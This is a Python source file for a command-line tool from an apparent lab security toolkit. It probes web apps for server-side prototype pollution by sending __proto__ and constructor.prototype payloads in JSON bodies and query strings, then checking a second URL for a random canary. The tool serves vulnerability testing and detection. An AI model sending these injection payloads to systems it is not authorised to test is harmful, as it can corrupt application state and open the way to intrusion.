#!/usr/bin/env python3
"""
redshift_toolkit.web.proto_pollution_probe — server-side prototype pollution
detector.

Methodology
-----------
1. POST a JSON body with `__proto__.<canary>: <value>` (and the
   constructor.prototype variant) to an endpoint suspected of merging
   user input.
2. Read a different endpoint that may reflect object-prototype properties.
3. If the canary appears, prototype pollution is happening.

Two modes:
- POST-then-GET: pollute via one URL, check via another (typical SPA design).
- POST-and-reflect: same URL pollution and observation (less common).

Probe payloads
--------------
- {"__proto__": {"canary_X": "Y"}}
- {"constructor": {"prototype": {"canary_X": "Y"}}}
- {"__proto__.canary_X": "Y"}    ← flattened-key form (some merge libs)
- Query-string form: ?__proto__[canary_X]=Y
- &constructor[prototype][canary_X]=Y

Usage
-----
  python3 -m redshift_toolkit.web.proto_pollution_probe \\
      --pollute https://app.example.com/api/merge \\
      --check https://app.example.com/api/me \\
      --auth-cookie 'session=...'

Author: Redshift Project — Module 16
License: MIT — Lab use only.
"""

from __future__ import annotations

import argparse
import json
import secrets
import sys
from dataclasses import dataclass, asdict, field
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode

from redshift_toolkit.web.http_client import HttpRequest, send

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


@dataclass
class ProtoFinding:
    payload_name: str
    polluted: bool
    canary_seen_in_check: bool
    note: str = ""


def _send_pollute(url: str, payload: dict, headers: list[tuple[str, str]],
                  *, tls_verify: bool, timeout: float):
    h = list(headers)
    h.append(("Content-Type", "application/json"))
    return send(HttpRequest(method="POST", url=url, headers=h,
                            body=json.dumps(payload)),
                timeout=timeout, tls_verify=tls_verify, follow_redirects=False)


def _send_pollute_query(url: str, qs_payload: dict[str, str],
                        headers: list[tuple[str, str]],
                        *, tls_verify: bool, timeout: float):
    sp = urlsplit(url)
    qs = parse_qsl(sp.query, keep_blank_values=True)
    for k, v in qs_payload.items():
        qs.append((k, v))
    new_url = urlunsplit((sp.scheme, sp.netloc, sp.path,
                          urlencode(qs, safe="[]"), sp.fragment))
    return send(HttpRequest(method="GET", url=new_url, headers=headers),
                timeout=timeout, tls_verify=tls_verify, follow_redirects=False)


def probe(pollute_url: str, check_url: str,
          *, auth: list[tuple[str, str]] | None = None,
          tls_verify: bool = True, timeout: float = 15.0
          ) -> list[ProtoFinding]:
    auth = list(auth or [])
    findings: list[ProtoFinding] = []

    canary = "rspoll" + secrets.token_hex(4)

    payloads: list[tuple[str, dict | None, dict | None]] = [
        ("body __proto__",
         {"__proto__": {canary: canary}}, None),
        ("body constructor.prototype",
         {"constructor": {"prototype": {canary: canary}}}, None),
        ("body flattened key",
         {f"__proto__.{canary}": canary}, None),
        ("query __proto__[k]",
         None, {f"__proto__[{canary}]": canary}),
        ("query constructor[prototype]",
         None, {f"constructor[prototype][{canary}]": canary}),
    ]

    for name, body, qs_kv in payloads:
        try:
            if body is not None:
                _send_pollute(pollute_url, body, auth,
                              tls_verify=tls_verify, timeout=timeout)
            elif qs_kv is not None:
                _send_pollute_query(pollute_url, qs_kv, auth,
                                     tls_verify=tls_verify, timeout=timeout)
        except Exception as e:
            findings.append(ProtoFinding(payload_name=name,
                                          polluted=False,
                                          canary_seen_in_check=False,
                                          note=f"pollute failed: {e}"))
            continue

        # Now read the check URL
        try:
            r = send(HttpRequest(method="GET", url=check_url, headers=auth),
                     timeout=timeout, tls_verify=tls_verify,
                     follow_redirects=False)
        except Exception as e:
            findings.append(ProtoFinding(payload_name=name,
                                          polluted=True,
                                          canary_seen_in_check=False,
                                          note=f"check failed: {e}"))
            continue
        body_text = r.body.decode("latin-1", errors="replace")
        seen = canary in body_text
        findings.append(ProtoFinding(payload_name=name, polluted=True,
                                      canary_seen_in_check=seen,
                                      note=("canary reflected in check URL"
                                            if seen else "no reflection")))
    return findings


def main() -> int:
    ap = argparse.ArgumentParser(description="Server-side prototype pollution prober.")
    ap.add_argument("--pollute", required=True,
                    help="URL to send pollution payload to")
    ap.add_argument("--check", required=True,
                    help="URL to check for reflected canary")
    ap.add_argument("--auth-cookie")
    ap.add_argument("--bearer")
    ap.add_argument("-H", "--header", action="append", default=[])
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()
    color = sys.stdout.isatty() and not args.no_color and not args.json

    auth = []
    if args.auth_cookie:
        auth.append(("Cookie", args.auth_cookie))
    if args.bearer:
        auth.append(("Authorization", f"Bearer {args.bearer}"))
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            auth.append((k.strip(), v.strip()))

    findings = probe(args.pollute, args.check, auth=auth,
                     tls_verify=not args.insecure, timeout=args.timeout)

    if args.json:
        print(json.dumps([asdict(f) for f in findings], indent=2))
    else:
        print(paint("\n=== Prototype pollution probe ===", BOLD, color))
        for f in findings:
            tag = (paint("[VULN]", RED, color) if f.canary_seen_in_check
                   else paint("[----]", GREEN, color))
            print(f"  {tag} {f.payload_name:<30} {f.note}")
    return 0 if not any(f.canary_seen_in_check for f in findings) else 1


if __name__ == "__main__":
    sys.exit(main())
